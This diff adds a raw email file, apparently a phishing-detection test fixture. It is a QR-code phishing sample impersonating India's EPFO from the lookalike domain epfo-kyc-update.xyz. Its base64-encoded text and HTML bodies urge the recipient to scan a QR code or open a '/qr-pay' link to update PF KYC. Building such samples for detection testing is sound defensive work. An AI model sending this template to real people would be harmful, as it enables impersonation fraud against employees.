@@ -1,0 +1,50 @@
+Content-Type: multipart/mixed; boundary="===============2555024583490676244=="
+MIME-Version: 1.0
+MIME-Version: 1.0
+Message-ID: <qr-003@epfo-kyc-update.xyz>
+Date: Sun, 15 Mar 2026 11:22:00 +0530
+Received: from mail.company.example.com (mail.company.example.com
+ [192.0.2.10]) by mx.company.example.com with ESMTPS id a1;
+ Sun, 15 Mar 2026 10:05:01 +0530
+Received: from smtp.example.net (smtp.example.net [192.0.2.20]) by
+ mail.company.example.com with ESMTPS id b2; Sun, 15 Mar 2026 10:04:50 +0530
+From: EPFO Alerts <noreply@epfo-kyc-update.xyz>
+To: employee@company.example.com
+Subject: Scan QR to update PF KYC
+
+--===============2555024583490676244==
+Content-Type: multipart/alternative;
+ boundary="===============6399993586194647048=="
+MIME-Version: 1.0
+
+--===============6399993586194647048==
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+
+U2NhbiB0aGUgYXR0YWNoZWQgUVIgdG8gdXBkYXRlIFBGIEtZQy4KSWYgeW91IGNhbm5vdCBzY2Fu
+OiBodHRwczovL2VwZm8ta3ljLXVwZGF0ZS54eXovcXItcGF5Cg==
+
+--===============6399993586194647048==
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PHA+U2NhbiB0aGUgUVIgaW1hZ2UgdG8gdXBkYXRlIFBGIEtZQy48L3A+PGlt
+ZyBzcmM9ImNpZDpxci1sYWJAcGhpc2hwcm9vZiIgYWx0PSJRUiIgLz48cD5GYWxsYmFjazogPGEg
+aHJlZj0iaHR0cHM6Ly9lcGZvLWt5Yy11cGRhdGUueHl6L3FyLXBheSI+b3BlbiBsaW5rPC9hPjwv
+cD48L2JvZHk+PC9odG1sPg==
+
+--===============6399993586194647048==--
+
+--===============2555024583490676244==
+Content-Type: image/png
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+Content-Disposition: inline; filename="qr-kyc.png"
+Content-ID: <qr-lab@phishproof>
+
+iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmM
+IQAAAABJRU5ErkJggg==
+
+--===============2555024583490676244==--
